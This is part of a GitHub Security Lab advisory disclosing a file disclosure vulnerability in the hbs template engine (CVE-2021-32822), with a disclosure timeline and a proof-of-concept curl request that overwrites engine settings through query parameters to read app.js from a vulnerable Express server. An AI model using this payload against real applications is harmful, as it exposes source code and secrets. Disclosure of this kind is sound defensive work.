<header class="post-header d-block mb-6">
      ...
      <h1 class="my-2 h00-mktg lh-condensed">GHSL-2021-020: File disclosure in hbs - CVE-2021-32822</h1>
...
<ul>
  ...
  <li>03/31/2021: Maintainer was notified about the disclosure of the issue and our intentions to publish the advisory</li>
  <li>04/22/2021: Maintainer was notified about the publication of the advisory</li>
</ul>
...
<p><code class="language-plaintext highlighter-rouge">hbs</code> mixes pure template data with engine configuration options through the Express render API. By overwriting internal configuration options a file disclosure vulnerability may be triggered in downstream applications.</p>
...
<span class="nx">app</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="nx">port</span><span class="p">,</span> <span class="p">()</span> <span class="o">=&gt;</span> <span class="p">{</span> <span class="p">})</span>
<span class="nx">module</span><span class="p">.</span><span class="nx">exports</span> <span class="o">=</span> <span class="nx">app</span><span class="p">;</span>
</code></pre></div></div>

<p>The following POC would retrieve the contents of the <code class="language-plaintext highlighter-rouge">app.js</code> from a vulnerable application:</p>

<div class="language-sh highlighter-rouge"><div class="highlight"><pre class="highlight"><code>curl <span class="s2">"http://localhost:3000/?settings%5Bviews%5D=.&amp;settings%5Bview%20options%5D%5Blayout%5D)=app.js"</span>
</code></pre></div></div>
...
<p>You can contact the GHSL team at <code class="language-plaintext highlighter-rouge">securitylab@github.com</code>, please include a reference to <code class="language-plaintext highlighter-rouge">GHSL-2021-020</code> in any communication regarding this issue.</p>
